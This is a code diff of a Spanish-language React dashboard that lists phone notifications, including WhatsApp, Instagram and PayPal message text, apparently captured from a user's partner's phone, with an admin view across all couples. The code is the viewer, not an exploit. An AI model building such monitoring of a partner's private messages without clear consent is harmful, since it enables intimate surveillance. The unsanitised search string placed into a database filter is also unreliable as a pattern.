@@ -1,13 +1,6 @@
 'use client'
-
 import { useEffect, useState, useCallback } from 'react'
-import {
-  supabase,
-  getNotificationLogs,
-  NotificationLog,
-  Couple,
-  getAllCouples,
-} from '@/lib/supabase'
+import { supabase, getAllCouples, type NotificationLog, type Couple } from '@/lib/supabase'
 
 const APP_EMOJI: Record<string, string> = {
   'com.whatsapp': '💬',
@@ -17,42 +10,28 @@ const APP_EMOJI: Record<string, string> = {
   'com.facebook.orca': '💙',
   'com.snapchat.android': '👻',
   'com.google.android.gm': '📧',
+  'com.google.android.apps.messaging': '💬',
   'com.spotify.music': '🎵',
   'com.netflix.mediaclient': '🎬',
+  'com.amazon.mShop.android.shopping': '📦',
+  'com.paypal.android.p2pmobile': '💰',
 }
-
 function appEmoji(pkg: string) { return APP_EMOJI[pkg] ?? '🔔' }
 
 function fmt(iso: string) {
-  return new Date(iso).toLocaleString('es', {
-    day: '2-digit', month: 'short', year: 'numeric',
-    hour: '2-digit', minute: '2-digit', second: '2-digit',
+  const d = new Date(iso)
+  return d.toLocaleString('es', {
+    day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit', second: '2-digit'
   })
 }
 
-function timeAgo(iso: string) {
-  const diff = Date.now() - new Date(iso).getTime()
-  const m = Math.floor(diff / 60000)
-  if (m < 1)  return 'Ahora'
-  if (m < 60) return `${m}m`
-  const h = Math.floor(m / 60)
-  if (h < 24) return `${h}h`
-  return `${Math.floor(h / 24)}d`
-}
-
-const PER_PAGE = 30
-
 export default function NotificationsPage() {
-  const [logs, setLogs] = useState<NotificationLog[]>([])
-  const [total, setTotal] = useState(0)
-  const [loading, setLoading] = useState(true)
-  const [search, setSearch] = useState('')
-  const [coupleId, setCoupleId] = useState('')
+  const [logs, setLogs]       = useState<NotificationLog[]>([])
   const [couples, setCouples] = useState<Couple[]>([])
-  const [page, setPage] = useState(0)
-  const [selected, setSelected] = useState<NotificationLog | null>(null)
-  const [liveCount, setLiveCount] = useState(0)
+  const [total, setTotal]     = useState(0)
+  const [loading, setLoading] = useState(true)
 
+  // Sesión actual
   const [session, setSession] = useState<{
     isAdmin: boolean
     coupleId: string | null
@@ -60,41 +39,64 @@ export default function NotificationsPage() {
     coupleName: string
   } | null>(null)
 
+  // Filtros
+  const [coupleId, setCoupleId] = useState('')
+  const [search, setSearch]     = useState('')
+  const [page, setPage]         = useState(0)
+  const PER_PAGE = 50
+
+  // Panel de detalle
+  const [selected, setSelected] = useState<NotificationLog | null>(null)
+
+  // Realtime badge
+  const [liveCount, setLiveCount] = useState(0)
+
+  // Cargar sesión
   useEffect(() => {
     fetch('/api/auth/me')
-      .then(r => r.json())
-      .then(d => {
-        if (d.session) {
-          setSession(d.session)
-          if (!d.session.isAdmin && d.session.coupleId) {
-            setCoupleId(d.session.coupleId)
+      .then(res => res.json())
+      .then(data => {
+        if (data.session) {
+          setSession(data.session)
+          if (!data.session.isAdmin && data.session.coupleId) {
+            setCoupleId(data.session.coupleId)
           }
         }
       })
-      .catch(() => {})
   }, [])
 
+  // Cargar parejas (solo si es admin)
   useEffect(() => {
     if (session?.isAdmin) {
-      getAllCouples().then(setCouples).catch(() => {})
+      getAllCouples().then(setCouples)
     }
   }, [session])
 
   const load = useCallback(async () => {
+    if (!session) return
     setLoading(true)
-    try {
-      const res = await getNotificationLogs({
-        coupleId: coupleId || undefined,
-        appName:  search   || undefined,
-        limit:    PER_PAGE,
-        offset:   page * PER_PAGE,
-      })
-      setLogs(res.data)
-      setTotal(res.count)
-    } finally {
-      setLoading(false)
+
+    // Forzar couple_id si el usuario NO es admin
+    const targetCoupleId = session.isAdmin ? coupleId : (session.coupleId || '')
+
+    let q = supabase
+      .from('notification_logs')
+      .select('*, couples(couple_names,partner_one,partner_two)', { count: 'exact' })
+      .order('received_at', { ascending: false })
+      .range(page * PER_PAGE, (page + 1) * PER_PAGE - 1)
+
+    if (targetCoupleId) {
+      q = q.eq('couple_id', targetCoupleId)
     }
-  }, [coupleId, search, page])
+    if (search) {
+      q = q.or(`app_name.ilike.%${search}%,title.ilike.%${search}%,text.ilike.%${search}%`)
+    }
+
+    const { data, count } = await q
+    setLogs((data ?? []) as NotificationLog[])
+    setTotal(count ?? 0)
+    setLoading(false)
+  }, [session, coupleId, search, page])
 
   useEffect(() => {
     if (session) {
@@ -102,6 +104,7 @@ export default function NotificationsPage() {
     }
   }, [session, load])
 
+  // Realtime suscripción filtrada
   useEffect(() => {
     if (!session) return
 
@@ -118,6 +121,7 @@ export default function NotificationsPage() {
         ...(session.isAdmin ? {} : { filter: `couple_id=eq.${session.coupleId}` })
       }, (payload) => {
         const newLog = payload.new as NotificationLog
+        // Si es admin y tiene filtro de pareja aplicado, verificar
         if (session.isAdmin && coupleId && newLog.couple_id !== coupleId) {
           return
         }
@@ -133,36 +137,51 @@ export default function NotificationsPage() {
   const totalPages = Math.ceil(total / PER_PAGE)
 
   return (
-    <div className="flex flex-col lg:flex-row h-full min-h-[calc(100vh-60px)] md:min-h-screen overflow-hidden">
+    <div style={{ display: 'flex', height: '100vh', overflow: 'hidden' }}>
 
       {/* ── Columna principal ── */}
-      <div className="flex-1 flex flex-col min-w-0 overflow-hidden">
+      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
 
         {/* Header */}
-        <div className="p-3 sm:p-5 md:p-6 border-b border-[#D4AF5A]/20 bg-[#190407] shrink-0">
-          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+        <div style={{
+          padding: '28px 28px 20px',
+          borderBottom: '1px solid rgba(212,175,90,0.2)',
+          backgroundColor: '#190407',
+          flexShrink: 0,
+        }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
             <div>
-              <p className="text-[9.5px] font-extrabold tracking-widest text-[#D4AF5A] uppercase mb-0.5">
+              <p style={{ fontSize: 9, fontWeight: 800, letterSpacing: 2, color: '#D4AF5A', marginBottom: 4 }}>
                 {session?.isAdmin ? 'REGISTRO EN TIEMPO REAL (ADMIN)' : `NOTIFICACIONES PRIVADAS • ${session?.coupleName}`}
               </p>
-              <h1 className="text-xl sm:text-2xl font-black text-[#F7EFE4] tracking-tight">
+              <h1 style={{ fontSize: 24, fontWeight: 900, color: '#F7EFE4' }}>
                 Notificaciones
               </h1>
-              <p className="text-xs text-[#A89186]">
+              <p style={{ fontSize: 12, color: '#A89186', marginTop: 3 }}>
                 {total.toLocaleString()} registros {session?.isAdmin ? 'totales' : 'de tu pareja'}
               </p>
             </div>
-
-            <div className="flex items-center gap-2 self-start sm:self-auto">
+            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
               {liveCount > 0 && (
-                <div className="flex items-center gap-1.5 bg-[#D4AF5A]/15 border border-[#D4AF5A]/40 rounded-full px-2.5 py-1 text-xs">
-                  <span className="w-2 h-2 rounded-full bg-[#4ade80] animate-pulse" />
-                  <span className="font-bold text-[#F3E5AB]">+{liveCount} en vivo</span>
+                <div style={{
+                  display: 'flex', alignItems: 'center', gap: 6,
+                  backgroundColor: 'rgba(212,175,90,0.12)',
+                  border: '1px solid rgba(212,175,90,0.4)',
+                  borderRadius: 20, padding: '6px 12px',
+                }}>
+                  <div style={{ width: 7, height: 7, borderRadius: 4, backgroundColor: '#4ade80' }} />
+                  <span style={{ fontSize: 11, fontWeight: 700, color: '#F3E5AB' }}>
+                    +{liveCount} en vivo
+                  </span>
                 </div>
               )}
               <button
                 onClick={() => { setLiveCount(0); load() }}
-                className="bg-[#D4AF5A] text-[#190407] rounded-xl px-3.5 py-1.5 text-xs font-black hover:bg-[#F3E5AB] transition-colors"
+                style={{
+                  backgroundColor: '#D4AF5A', color: '#190407',
+                  border: 'none', borderRadius: 10, padding: '8px 16px',
+                  fontSize: 12, fontWeight: 800, cursor: 'pointer',
+                }}
               >
                 ↻ Actualizar
               </button>
@@ -170,18 +189,27 @@ export default function NotificationsPage() {
           </div>
 
           {/* Filtros */}
-          <div className="flex flex-col sm:flex-row gap-2 mt-3.5">
+          <div style={{ display: 'flex', gap: 10, marginTop: 16 }}>
             <input
               value={search}
               onChange={e => { setSearch(e.target.value); setPage(0) }}
-              placeholder="Buscar app, contacto o texto..."
-              className="flex-1 bg-[#2A080D] border border-[#D4AF5A]/30 rounded-xl px-3.5 py-2 text-xs sm:text-sm text-[#F7EFE4] placeholder-[#A89186] outline-none"
+              placeholder="Buscar app, título o texto..."
+              style={{
+                flex: 1, backgroundColor: '#2A080D', border: '1px solid rgba(212,175,90,0.3)',
+                borderRadius: 10, padding: '9px 14px', color: '#F7EFE4', fontSize: 13,
+                outline: 'none',
+              }}
             />
+            {/* Dropdown de Parejas solo visible para ADMIN */}
             {session?.isAdmin && (
               <select
                 value={coupleId}
                 onChange={e => { setCoupleId(e.target.value); setPage(0) }}
-                className="bg-[#2A080D] border border-[#D4AF5A]/30 rounded-xl px-3 py-2 text-xs sm:text-sm text-[#C7B7A3] outline-none cursor-pointer sm:min-w-[180px]"
+                style={{
+                  backgroundColor: '#2A080D', border: '1px solid rgba(212,175,90,0.3)',
+                  borderRadius: 10, padding: '9px 14px', color: '#C7B7A3', fontSize: 13,
+                  minWidth: 180, outline: 'none', cursor: 'pointer',
+                }}
               >
                 <option value="">Todas las parejas</option>
                 {couples.map(c => (
@@ -192,163 +220,166 @@ export default function NotificationsPage() {
           </div>
         </div>
 
-        {/* Lista de Notificaciones */}
-        <div className="flex-1 overflow-y-auto p-3 sm:p-5 space-y-2 pb-24">
+        {/* Tabla */}
+        <div style={{ flex: 1, overflowY: 'auto', padding: '0 0 80px' }}>
           {loading ? (
-            <div className="py-20 text-center text-xs sm:text-sm text-[#A89186]">Cargando notificaciones...</div>
+            <div style={{ padding: 40, textAlign: 'center', color: '#A89186' }}>Cargando...</div>
           ) : logs.length === 0 ? (
-            <div className="py-20 text-center">
-              <p className="text-4xl mb-3">🔕</p>
-              <p className="text-sm font-bold text-[#A89186]">No se encontraron notificaciones</p>
-              <p className="text-xs text-[#A89186]/70 mt-1">Los mensajes entrantes de WhatsApp, Instagram, etc., aparecerán aquí.</p>
+            <div style={{ padding: 60, textAlign: 'center' }}>
+              <p style={{ fontSize: 40, marginBottom: 12 }}>🔕</p>
+              <p style={{ color: '#A89186', fontSize: 14 }}>No se encontraron notificaciones</p>
+              {!session?.isAdmin && (
+                <p style={{ color: '#6D2932', fontSize: 12, marginTop: 4 }}>
+                  Las notificaciones que reciba el teléfono de tu pareja aparecerán aquí automáticamente.
+                </p>
+              )}
             </div>
           ) : (
-            logs.map(log => {
-              const isSel = selected?.id === log.id
-              return (
-                <div
-                  key={log.id}
-                  onClick={() => setSelected(log)}
-                  className={`
-                    p-3 sm:p-4 rounded-xl border cursor-pointer transition-all flex items-start gap-3
-                    ${isSel
-                      ? 'bg-[#D4AF5A]/15 border-[#D4AF5A] shadow-sm'
-                      : 'bg-[#2A080D] border-[#D4AF5A]/15 hover:border-[#D4AF5A]/30'
-                    }
-                  `}
-                >
-                  <span className="text-xl sm:text-2xl shrink-0 pt-0.5">
-                    {appEmoji(log.package_name)}
-                  </span>
-
-                  <div className="flex-1 min-w-0">
-                    <div className="flex items-center justify-between gap-2 mb-0.5">
-                      <span className="text-xs font-bold text-[#D4AF5A] truncate">
-                        {log.app_name}
-                      </span>
-                      <span className="text-[10px] text-[#A89186] shrink-0 font-medium">
-                        {timeAgo(log.received_at)}
-                      </span>
-                    </div>
-
-                    {log.title && (
-                      <p className="text-xs sm:text-sm font-extrabold text-[#F7EFE4] truncate">
-                        {log.title}
-                      </p>
-                    )}
-
-                    <p className="text-xs text-[#C7B7A3] line-clamp-2 mt-0.5 leading-relaxed">
-                      {log.big_text || log.text || '(Sin texto previo)'}
-                    </p>
-
+            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+              <thead>
+                <tr style={{ borderBottom: '1px solid rgba(212,175,90,0.15)', position: 'sticky', top: 0, backgroundColor: '#190407', zIndex: 1 }}>
+                  {['App', 'Título', 'Texto', session?.isAdmin ? 'Pareja' : '', 'Hora'].filter(Boolean).map(h => (
+                    <th key={h} style={{
+                      padding: '10px 14px', textAlign: 'left',
+                      fontSize: 9, fontWeight: 800, letterSpacing: 1.3, color: '#D4AF5A',
+                    }}>{h}</th>
+                  ))}
+                </tr>
+              </thead>
+              <tbody>
+                {logs.map((log, i) => (
+                  <tr
+                    key={log.id}
+                    onClick={() => setSelected(log)}
+                    style={{
+                      borderBottom: '1px solid rgba(109,41,50,0.3)',
+                      backgroundColor: selected?.id === log.id
+                        ? 'rgba(212,175,90,0.08)'
+                        : i % 2 === 0 ? 'transparent' : 'rgba(42,8,13,0.4)',
+                      cursor: 'pointer',
+                      transition: 'background 0.1s',
+                    }}
+                  >
+                    <td style={{ padding: '10px 14px', fontSize: 13, color: '#F3E5AB', fontWeight: 600, whiteSpace: 'nowrap' }}>
+                      {appEmoji(log.package_name)} {log.app_name}
+                    </td>
+                    <td style={{ padding: '10px 14px', fontSize: 12, color: '#EFE5D8', maxWidth: 220, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                      {log.title ?? <span style={{ color: '#6D2932' }}>—</span>}
+                    </td>
+                    <td style={{ padding: '10px 14px', fontSize: 12, color: '#C7B7A3', maxWidth: 260, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                      {log.big_text || log.text || <span style={{ color: '#6D2932' }}>—</span>}
+                    </td>
                     {session?.isAdmin && (
-                      <p className="text-[10px] text-[#A89186]/80 mt-1 truncate">
-                        👤 {log.couples?.couple_names || 'Pareja'}
-                      </p>
+                      <td style={{ padding: '10px 14px', fontSize: 11, color: '#A89186', whiteSpace: 'nowrap' }}>
+                        {(log.couples as any)?.couple_names ?? '—'}
+                      </td>
                     )}
-                  </div>
-                </div>
-              )
-            })
+                    <td style={{ padding: '10px 14px', fontSize: 11, color: '#6D2932', whiteSpace: 'nowrap' }}>
+                      {fmt(log.received_at)}
+                    </td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
           )}
         </div>
 
         {/* Paginación */}
         {totalPages > 1 && (
-          <div className="p-3 border-t border-[#D4AF5A]/20 bg-[#190407] flex items-center justify-between text-xs">
+          <div style={{
+            padding: '12px 20px', borderTop: '1px solid rgba(212,175,90,0.15)',
+            display: 'flex', justifyContent: 'center', alignItems: 'center', gap: 8,
+            backgroundColor: '#190407', flexShrink: 0,
+          }}>
             <button
+              onClick={() => setPage(p => Math.max(0, p - 1))}
               disabled={page === 0}
-              onClick={() => setPage(p => p - 1)}
-              className="px-3 py-1.5 rounded-lg bg-[#2A080D] border border-[#D4AF5A]/30 text-[#EFE5D8] disabled:opacity-40"
-            >
-              ← Anterior
-            </button>
-            <span className="text-[#A89186]">
+              style={{ ...btnStyle, opacity: page === 0 ? 0.4 : 1 }}
+            >‹ Anterior</button>
+            <span style={{ fontSize: 12, color: '#A89186', padding: '0 8px' }}>
               Página {page + 1} de {totalPages}
             </span>
             <button
+              onClick={() => setPage(p => Math.min(totalPages - 1, p + 1))}
               disabled={page >= totalPages - 1}
-              onClick={() => setPage(p => p + 1)}
-              className="px-3 py-1.5 rounded-lg bg-[#2A080D] border border-[#D4AF5A]/30 text-[#EFE5D8] disabled:opacity-40"
-            >
-              Siguiente →
-            </button>
+              style={{ ...btnStyle, opacity: page >= totalPages - 1 ? 0.4 : 1 }}
+            >Siguiente ›</button>
           </div>
         )}
       </div>
 
-      {/* ── Panel de Detalle (Modal en móvil, Side Panel en desktop) ── */}
+      {/* ── Panel de detalle ── */}
       {selected && (
-        <div className="fixed inset-0 z-50 lg:static lg:z-auto bg-black/75 backdrop-blur-sm lg:backdrop-blur-none lg:bg-transparent flex justify-end">
-          <div className="w-full max-w-md lg:w-80 bg-[#2A080D] border-l border-[#D4AF5A]/30 p-5 sm:p-6 overflow-y-auto flex flex-col gap-4 shadow-2xl h-full">
-            <div className="flex justify-between items-center border-b border-[#D4AF5A]/20 pb-3">
-              <p className="text-[10px] font-extrabold tracking-widest text-[#D4AF5A] uppercase">
-                DETALLE DE NOTIFICACIÓN
-              </p>
-              <button
-                onClick={() => setSelected(null)}
-                className="w-8 h-8 flex items-center justify-center rounded-lg bg-[#190407] text-[#A89186] text-sm hover:text-[#F7EFE4]"
-              >
-                ✕
-              </button>
-            </div>
+        <div style={{
+          width: 320, flexShrink: 0,
+          backgroundColor: '#2A080D',
+          borderLeft: '1px solid rgba(212,175,90,0.25)',
+          overflowY: 'auto',
+          padding: 24,
+          display: 'flex', flexDirection: 'column', gap: 20,
+        }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+            <p style={{ fontSize: 10, fontWeight: 800, letterSpacing: 1.5, color: '#D4AF5A' }}>DETALLE</p>
+            <button onClick={() => setSelected(null)} style={{ background: 'none', border: 'none', color: '#A89186', fontSize: 18, cursor: 'pointer', lineHeight: 1 }}>✕</button>
+          </div>
 
-            <div>
-              <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">APLICACIÓN</p>
-              <div className="flex items-center gap-2 mt-1">
-                <span className="text-2xl">{appEmoji(selected.package_name)}</span>
-                <div>
-                  <p className="text-sm font-black text-[#F3E5AB]">{selected.app_name}</p>
-                  <p className="text-[10px] text-[#A89186] truncate max-w-[200px]">{selected.package_name}</p>
-                </div>
-              </div>
-            </div>
+          {/* App */}
+          <div>
+            <p style={labelStyle}>APLICACIÓN</p>
+            <p style={{ fontSize: 20, marginTop: 2 }}>{appEmoji(selected.package_name)}</p>
+            <p style={{ fontSize: 15, fontWeight: 800, color: '#F3E5AB', marginTop: 4 }}>{selected.app_name}</p>
+            <p style={{ fontSize: 11, color: '#6D2932', marginTop: 2 }}>{selected.package_name}</p>
+          </div>
 
-            {session?.isAdmin && (
-              <div>
-                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">PAREJA</p>
-                <p className="text-xs font-bold text-[#EFE5D8] mt-0.5">
-                  {(selected.couples as any)?.couple_names ?? '—'}
-                </p>
-              </div>
-            )}
+          {/* Pareja (solo admin) */}
+          {session?.isAdmin && (
+            <Field label="PAREJA" value={(selected.couples as any)?.couple_names ?? '—'} />
+          )}
 
-            {selected.title && (
-              <div>
-                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">CONTACTO / TÍTULO</p>
-                <p className="text-sm font-extrabold text-[#F7EFE4] mt-0.5">{selected.title}</p>
-              </div>
-            )}
+          {/* Título */}
+          {selected.title && <Field label="TÍTULO" value={selected.title} />}
 
-            {(selected.big_text || selected.text) && (
-              <div>
-                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">MENSAJE COMPLETO</p>
-                <div className="mt-1 p-3 rounded-xl bg-[#190407] border border-[#D4AF5A]/20 text-xs sm:text-sm text-[#EFE5D8] leading-relaxed break-words whitespace-pre-wrap">
-                  {selected.big_text || selected.text}
-                </div>
-              </div>
-            )}
+          {/* Texto */}
+          {selected.text && <Field label="TEXTO" value={selected.text} />}
 
-            {selected.sub_text && (
-              <div>
-                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">SUBTEXTO / INFO</p>
-                <p className="text-xs text-[#C7B7A3] mt-0.5">{selected.sub_text}</p>
-              </div>
-            )}
+          {/* Big Text */}
+          {selected.big_text && selected.big_text !== selected.text && (
+            <Field label="TEXTO EXPANDIDO" value={selected.big_text} />
+          )}
 
-            <div className="border-t border-[#D4AF5A]/15 pt-3 space-y-2 text-xs">
-              <div>
-                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">HORA RECIBIDA</p>
-                <p className="text-[#EFE5D8] mt-0.5">{fmt(selected.received_at)}</p>
-              </div>
-              <div>
-                <p className="text-[9.5px] font-extrabold tracking-widest text-[#6D2932] uppercase">REGISTRADA EN NUBE</p>
-                <p className="text-[#A89186] mt-0.5">{fmt(selected.created_at)}</p>
-              </div>
-            </div>
+          {/* Sub text */}
+          {selected.sub_text && <Field label="SUBTÍTULO" value={selected.sub_text} />}
+
+          {/* Timestamps */}
+          <div>
+            <p style={labelStyle}>RECIBIDA</p>
+            <p style={{ fontSize: 13, color: '#EFE5D8', marginTop: 3 }}>{fmt(selected.received_at)}</p>
+          </div>
+          <div>
+            <p style={labelStyle}>GUARDADA EN SUPABASE</p>
+            <p style={{ fontSize: 13, color: '#EFE5D8', marginTop: 3 }}>{fmt(selected.created_at)}</p>
           </div>
         </div>
       )}
     </div>
   )
+}
+
+function Field({ label, value }: { label: string; value: string }) {
+  return (
+    <div>
+      <p style={labelStyle}>{label}</p>
+      <p style={{ fontSize: 13, color: '#EFE5D8', marginTop: 3, lineHeight: 1.5, wordBreak: 'break-word' }}>{value}</p>
+    </div>
+  )
+}
+
+const labelStyle: React.CSSProperties = {
+  fontSize: 9, fontWeight: 800, letterSpacing: 1.4, color: '#6D2932',
+}
+
+const btnStyle: React.CSSProperties = {
+  backgroundColor: '#4D141C', border: '1px solid rgba(212,175,90,0.3)',
+  borderRadius: 8, padding: '6px 14px', color: '#C7B7A3',
+  fontSize: 12, fontWeight: 600, cursor: 'pointer',
 }
